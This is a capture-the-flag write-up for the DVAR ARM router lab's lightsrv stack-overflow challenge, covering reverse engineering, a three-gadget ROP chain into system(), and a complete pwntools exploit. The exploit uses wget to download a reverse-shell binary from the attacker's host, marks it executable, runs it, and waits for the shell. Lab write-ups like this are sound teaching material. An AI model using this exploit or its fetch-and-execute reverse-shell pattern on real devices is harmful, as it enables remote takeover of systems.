# DVAR bonus round

http://blog.exploitlab.net/2018/03/dvar-rop-challenge-bonus-round-unlocked.html

## Challenge description:

Part 2 of the DVAR challenge is to exploit a stack overflow in "/usr/bin/lightsrv" the traffic signal lights server. lightsrv is automatically started on boot, and listens on port 8080.

Your task is:

1. Find the buffer overflow vector for lightsrv
2. Crash the program and get pc=0x41414140
3. Work your way through building a proper ROP chain (XN is enabled!)
4. Get a working shell!

Hints:
```bash
exploitlab-DVAR:~# ps
  PID USER  VSZ STAT COMMAND
    :    :    : :    :
  245 root  656 S    /usr/bin/miniweb
  246 root  640 S    /usr/bin/lightsrv <------- [TARGET]
  292 root 1016 S    -ash
  321 root 1012 R    ps
```
```bash
exploitlab-DVAR:~# cat /proc/$(pidof lightsrv)/maps
00010000-00012000 r-xp 00000000 08:00 512   /usr/bin/lightsrv
00022000-00023000 rw-p 00002000 08:00 512   /usr/bin/lightsrv
40000000-40064000 r-xp 00000000 08:00 185   /lib/libc.so
40064000-40065000 r-xp 00000000 00:00 0     [sigpage]
40073000-40074000 r--p 00063000 08:00 185   /lib/libc.so
40074000-40075000 rw-p 00064000 08:00 185   /lib/libc.so
40075000-40077000 rw-p 00000000 00:00 0
40078000-40089000 r-xp 00000000 08:00 2791  /lib/libgcc_s.so.1
40089000-4008a000 rw-p 00009000 08:00 2791  /lib/libgcc_s.so.1
befdf000-bf000000 rw-p 00000000 00:00 0     [stack]
ffff0000-ffff1000 r-xp 00000000 00:00 0     [vectors]
```
If you haven't played with DVAR yet, download it from here:

http://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html

## Lookin at it

Based on the description we can already see that stack isnt executable. We can also see that ASLR is disabled. (always good to double check though)

Lightsrv is a http server, and our input must be a "valid" HTTP GET request:

```
GET / SOME DATA \n\n
```

I transferred the binary to my host machine and took a look at it with radare2. The description (and the exploitlab class) implies that it has a stack overflow.

The DVAR vm also has gdbserver on it, so that makes it nice and easy to debug. Radare2 supports connecting to gdbserver (kinda buggy), but it worked well in this case, so I used that instead of gdb-gef.

One thing that made this challenge slightly annoying was that lightsrv directly wrote to /dev/console instead of stdout.

![fopen /dev/console](https://i.imgur.com/Jza5Exv.png)

First thing i did was look for functions that have large stack arrays.

![sym.handle_single_request](https://i.imgur.com/lR0j0sd.png)

After playing around with debugging and reverse engineering sym.handle_single_request, i found some key things.

 - loops, uses recv to read 0x800 bytes into obj.buf, then appends it to the (0x1000 sized) buffer on the stack.
   - Doesnt limit the number of times it will append to the end of the buffer, so the ol' give it AAAAAAAAAAAAAAAA trick will eventually overwrite saved lr.
   - Also ignored everthing before the slash in "GET /".
 - uses recv (so nulls, spaces, etc are fine)

There is also a very nice little part of code in sym.handle_led_cmd that calls libc's system for us.

![calls system](https://i.imgur.com/jZXGwhk.png)

At this point, the exploit seems very simple compared to the sort of stuff that was normally taught in class.

 - Overflow in sym.handle_single_request, overwrite PC
   - Also put the command we want to execute somewhere in there, so it gets in obj.buf
 - ROP to get the address of obj.buf(0x000221d0) into r0
 - ROP into sym.handle_led_cmd at bl sym.imp.system (0x00010e08)

Since nullies are allowed in our input, we can direclty include low addresses without any tricky xor nonsense.
We can have a very simple rop chain that only uses the lightsrv binary. This means our rop chain will also survive enabling ASLR, as lightsrv is not PIE. This is mostly because I was lazy and didnt want to SCP over the libc from DVAR.

lightsrv contains a very nice gadget for setting r0.

![pop r0](https://i.imgur.com/iQdQAve.png)

R2's gadget search is also nice, and applies the static binary offset.

![pop r0](https://i.imgur.com/91mkS6D.png)

My chain ended up being this cute little thing:

```
0x00010940 #: pop (r0, lr); bx lr
0x000221d0 #: address of the obj.buf (will get placed into r0)
0x00010e28 #: bl sym.imp.system in sym.handle_led_cmd
```

The only thing that is left to get arbitrary command exeuction is get our command string aligned so that it fits right in obj.buf. I basically just did this through trial and error, but a cyclic pattern would've helped a lot here. My input turned out to give me 36 bytes of space to put the command before overwriting saved lr. I probably could've  fiddled with adding spaces in between the "GET" and the "/" to get a different offset, but 36 was enough.

Because the 'nc' command on the DVAR vm is a special busybox version instead of a full netcat, it does not allow for easy reverse shells. DVAR does come with wget, so i just planned to abuse that to download a reverse shell binary and then later run it. I ended up using one of the reverse shells that we had made in the class, hosted it on a http server running on the host vm, and downloaded it to DVAR during the exploit.

This challenge turned out to be surprisingly simple. I had started it assuming I would have to write a full ropchain for a mprotect stack style exploit, with no nulls, newlines, or spaces allowed.

## exploit

```python
#!/usr/bin/python2
#for hosting a http server to DL from
import SimpleHTTPServer
import SocketServer
#and ye olden pwntools
from pwn import *

def httpserv():
	httpd = SocketServer.TCPServer(("", 8000), SimpleHTTPServer.SimpleHTTPRequestHandler)
	print "serving at port", 8000
	httpd.serve_forever()



def execmd(command):
		##ip of the dvar
	s = remote('172.16.99.129', '8080');
	s.send('GET /' + 'A' * 0xffb);
	buf = command + 'A' * (36 - len(command));
	s.send(buf);
	s.send(p32(0x00010940)); #: pop (r0, lr); bx lr
	s.send(p32(0x221d0)); #: address of the temporary buffer
	s.send(p32(0x10e28)); #: bl sym.imp.system
	s.send('d'*4);
	s.send('\n\n');
	s.close();

def sploit():
	sleep(2)
	print('downloading reverse shell')
	execmd('wget http://172.16.99.1:8000/r\0')
	sleep(1)
	print('setting execute')
	execmd('chmod +x ./r\0')
	sleep(1)
	print('starting reverse shell')
	execmd('./r\0')

#need to run the http server at the same time we issue "commands" to the lightsrv
from pwnlib.context import Thread as PwnThread

PwnThread(target=httpserv).start()
PwnThread(target=sploit).start()
l = listen(26985)
l.wait_for_connection()
l.interactive()
```


## fin

Thanks to Saumil Shah for the excelent class and take-home challenge. It was a blast.